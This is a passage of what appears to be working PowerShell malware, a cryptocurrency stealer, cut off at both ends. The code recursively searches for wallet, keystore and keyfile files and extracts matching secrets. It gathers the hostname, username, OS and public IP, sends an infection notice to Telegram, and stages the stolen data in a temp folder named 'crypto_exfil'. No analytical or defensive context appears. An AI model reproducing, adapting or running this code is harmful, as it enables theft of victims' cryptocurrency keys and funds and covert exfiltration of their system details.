','*.wallet','*.keystore','*.keyfile');foreach($ScanPath in $ScanPaths){if(Test-Path $ScanPath){foreach($Ext in $Exts){$Files=Get-ChildItem -Path $ScanPath -Filter $Ext -Recurse -Depth 4 -ErrorAction SilentlyContinue;foreach($File in $Files){if($File.Length -lt 30MB -and $File.Length -gt 5){try{$Content=Get-Content -Path $File.FullName -Raw -ErrorAction SilentlyContinue;if($Content -and $Content.Length -gt 10){$Matches=Get-CryptoMatches -Content $Content;if($Matches.Count -gt 0){$Results+=@{"file_path"=$File.FullName;"file_name"=$File.Name;"file_size"=$File.Length;"matches"=$Matches}}}}catch{}}}}}};return $Results};$HostInfo=@{"hostname"=$env:COMPUTERNAME;"username"=$env:USERNAME;"os"=(Get-WmiObject Win32_OperatingSystem).Caption;"ip"=(Invoke-RestMethod -Uri 'https://api.ipify.org' -TimeoutSec 10 -ErrorAction SilentlyContinue);"timestamp"=Get-Date -Format 'yyyy-MM-dd HH:mm:ss'};Send-TelegramMessage "<b>=== CRYPTO SCANNER STARTED ===</b>`nHost: $($HostInfo.hostname)`nUser: $($HostInfo.username)`nOS: $($HostInfo.os)`nIP: $($HostInfo.ip)`nTime: $($HostInfo.timestamp)";$FoundFiles=Scan-CryptoFiles;if($FoundFiles.Count -gt 0){$StagingDir="$env:TEMP\crypto_exfil_$(Get-Random -Minimum 10000 -Maximum 99999)";$DataDir="$StagingDir\data";$ExtractedDir="$StagingDir\extracted";New-Item -Path $StagingDir -ItemType Directory -Force|Out-Null;New-Item -Path $DataDir -ItemType Directory -Force|Out-Null;New-Item -Path $ExtractedDir -ItemType Directory -Force|Out-Null;$SystemInfoFile="$StagingDir\system_info.txt";$SysContent="=== SYSTEM INFO ===`nHostname: $($HostInfo.hostname)`nUsername: $($HostInfo.username)`nOS: $($HostInfo.os)`nIP: $($HostInfo.ip)`nTime: $($HostInfo.timestamp)`n`n=== FILES FOUND: $($FoundFiles.Count) ===";$SysContent|Set-Content -Path $SystemInfoFile -Force;$AllExtractedData="$ExtractedDir\all_extracted_data.txt";$AllData=@();$AllData+="=== CRYPTO EXTRACTION REPORT ===";$AllData+="Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')";$AllData+="Host: $($HostInfo.h